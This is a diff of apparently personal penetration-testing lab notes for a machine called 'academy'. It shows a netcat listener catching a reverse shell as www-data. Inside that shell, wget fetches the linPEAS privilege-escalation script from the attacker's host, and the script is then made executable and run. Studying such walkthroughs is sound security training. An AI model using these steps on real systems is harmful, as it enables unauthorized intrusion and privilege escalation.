@@ -383,15 +383,73 @@ Here is the linpeas --> https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 You can copy the script: https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh in /root/transfer
 
 ```
-mkdir 
+┌──(root㉿kali)-[~]
+└─# mkdir /transfer    
+┌──(root㉿kali)-[~]
+└─# cd /transfer  
+┌──(root㉿kali)-[/transfer]
+└─# nano linpeas.sh                              
+┌──(root㉿kali)-[/transfer]
+└─# ls
+linpeas.sh
 
 ```
 
+Now lets do the privilege escalation
 
 
+![[Pasted image 20240706011130.png]]
 
 
+Now we will do the download or `wget` to copy the linpeas to the shell(of the remote machine) that we access using our kali
 
+![[Pasted image 20240706011330.png]]
+
+
+```┌──(root㉿kali)-[~]
+└─# nc -nvlp 1234                                                  
+listening on [any] 1234 ...
+connect to [192.168.64.4] from (UNKNOWN) [192.168.64.3] 43132
+Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+ 00:56:22 up 45 min,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     tty1     -                23:40    1:15m  0.22s  0.11s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ sudo i
+/bin/sh: 2: sudo: not found
+$ locate sudo
+/bin/sh: 3: locate: not found
+$ 
+$ 
+$ cd /tmp       
+$ pwd
+/tmp
+$ wget http://192.168.64.4/linpeas.sh
+--2024-07-06 01:13:44--  http://192.168.64.4/linpeas.sh
+Connecting to 192.168.64.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 157746 (154K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+     0K .......... .......... .......... .......... .......... 32% 22.5M 0s
+    50K .......... .......... .......... .......... .......... 64% 57.7M 0s
+   100K .......... .......... .......... .......... .......... 97% 15.4M 0s
+   150K ....                                                  100% 15.5M=0.006s
+
+2024-07-06 01:13:44 (23.4 MB/s) - 'linpeas.sh' saved [157746/157746]
+
+$ 
+$ ls
+linpeas.sh
+$ chmod +x linpeas.sh
+$ ls
+linpeas.sh
+$ ./linpeas.sh  
+
+```
 
 
 
